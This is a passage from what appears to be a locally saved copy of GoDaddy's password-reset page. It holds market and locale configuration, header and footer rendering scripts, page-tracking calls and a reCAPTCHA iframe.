繁體中文","countryName":"香港","languageName":"繁體中文","currency":"HKD","countrySite":"hk","primaryLanguageForCountry":true,"displayTaxesAndFees":"NONE","vatIncluded":true,"languageAlias":"zh:t","displayCode":"繁體中文"},"zh-SG":{"market":"zh-SG","internal":false,"countryCode":"sg","languageCode":"zh","description":"新加坡 - 简体中文","countryName":"新加坡","languageName":"简体中文","currency":"CNY","countrySite":"sg","primaryLanguageForCountry":false,"displayTaxesAndFees":"ALL","vatIncluded":true,"languageAlias":"zh:s","displayCode":"简体中文"},"zh-TW":{"market":"zh-TW","internal":false,"countryCode":"tw","languageCode":"zh","description":"台灣 - 繁體中文","countryName":"台灣","languageName":"繁體中文","currency":"TWD","countrySite":"tw","primaryLanguageForCountry":true,"displayTaxesAndFees":"ALL","vatIncluded":true,"languageAlias":"zh:t","displayCode":"繁體中文"}},"supportMatrix":{"Chrome":["60.0"],"Firefox":["51.0"],"Safari":["9.0"],"Internet Explorer":[null,"10.0"],"Edge":["15.0"],"Samsung Internet":["5.4"]},"whitelistedUserAgents":["crm-desktop","FxiOS"],"notificationsVersion":1});
    if (ux.eldorado.page) {
      Object.keys(ux.eldorado.page).forEach(function (prop) {
        var value = ux.eldorado.page[prop];
        if (typeof value === 'object' && !Array.isArray(value)) {
          ux.eldorado.data.merge(prop, value);
        } else {
          ux.eldorado.data.set(prop, value);
        }
      });
    }
  });
  ux.data = {"privateLabelId":1,"privateLabelName":"GoDaddy","privateLabelType":1,"progId":"GoDaddy","manifest":"UtilityHeader","manifestVersion":"19.3.5","market":"en-US","currency":"USD","countryName":"United States","languageName":"English","app":"sso","appName":"Unknown","env":"prod","split":"","supportContacts":{"technicalSupportLabel":"Contact Us 24/7","technicalSupportPhone":"480-505-8877","technicalSupportHours":"24/7 Support","technicalSupportDescription":"Call our award-winning sales & support team 24/7","liveChatHours":"Hours: All Day Mon – Fri","cityContacts":{"Primary":{"liveChatHours":"Call our award-winning sales & support team 24/7","technicalSupportDescription":"Call our award-winning sales & support team 24/7","technicalSupportHours":"Call our award-winning sales & support team 24/7","technicalSupportLabel":"Contact Us 24/7","technicalSupportPhone":"480-505-8877"}}}};
  ux.data.policy = window._policy;
</script><script>
  window.ux.eldorado._onDelayedJSLoadedFns.push(function delayedMounts(err) {
    if (err) return;
    ReactDOM.render(
      React.createElement(UtilityHeader.Header, ux.eldorado.data.props),
      document.getElementById('header-85ff98c4b0d823d68217b41206a35a77')
    );
    ReactDOM.render(
      React.createElement(UtilityHeader.Footer, ux.eldorado.data.props),
      document.getElementById('footer-85ff98c4b0d823d68217b41206a35a77')
    );
  });
</script><script>
    var _trfq = _trfq || [];
function fire_virtual_page(name)
{
    _trfq.push(['cmdGetTrackingValues', getvg]);
    function getvg(data)
    {
        if('vg' in data && data['vg'] && data['vg'] != 'undefined')
        {
          _trfq.push(["cmdLogPageRequest", name.toString()]);
        }
        else
        {
          setTimeout(function(){_trfq.push(['cmdGetTrackingValues', getvg]);}, 100);
        }
    }
}

    fire_virtual_page("/virtual-account/v1/account/reset");


    var _trfq = _trfq || [];
function fire_virtual_event(name)
{
     _trfq.push(["cmdLogImpression", name.toString()]);
}



  </script><script>
    window.sso = window.sso || {};
</script><script src=""></script><script>
  document.authReady = true;
  window.ux.eldorado.ready(function() {
      var supportHours = '';
      if (typeof (window.ux) === "object" &&
          typeof (window.ux.data) === "object" &&
          typeof (window.ux.data.supportContacts) === "object" &&
          ux.data.supportContacts.hasOwnProperty('technicalSupportHours')) {
          supportHours = ux.eldorado.data.supportContacts["technicalSupportHours"] || '';
      }
      if (document.getElementById("tagline2") && document.getElementById("tagline-shadow")) {
          if (supportHours.indexOf('24/7') >= 0) {
              document.getElementById("tagline2").innerHTML = '';
          } else {
              document.getElementById("tagline2").innerHTML = '';
          }
          document.getElementById("tagline-shadow").style.display = '';
      }
  });
</script><!--Build info
App: v1
Build time: Fri Jan 25 15:00:35 MST 2019
Build number: 1995
-->

<div style="background-color: rgb(255, 255, 255); border: 1px solid rgb(204, 204, 204); box-shadow: rgba(0, 0, 0, 0.2) 2px 2px 3px; position: absolute; transition: visibility 0s linear 0.3s, opacity 0.3s linear 0s; opacity: 0; visibility: hidden; z-index: 2000000000; left: 0px; top: -10000px;"><div style="width: 100%; height: 100%; position: fixed; top: 0px; left: 0px; z-index: 2000000000; background-color: rgb(255, 255, 255); opacity: 0.05;"></div><div class="g-recaptcha-bubble-arrow" style="border: 11px solid transparent; width: 0px; height: 0px; position: absolute; pointer-events: none; margin-top: -11px; z-index: 2000000000;"></div><div class="g-recaptcha-bubble-arrow" style="border: 10px solid transparent; width: 0px; height: 0px; position: absolute; pointer-events: none; margin-top: -10px; z-index: 2000000000;"></div><div style="z-index: 2000000000; position: relative;"><iframe title="recaptcha challenge" src="./Reset_My_Password_files/bframe.html" name="c-ny88w0ux84uj" frameborder="0" scrolling="no" sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox" style="width: 100%; height: 100%;"></iframe></div></div></body></html>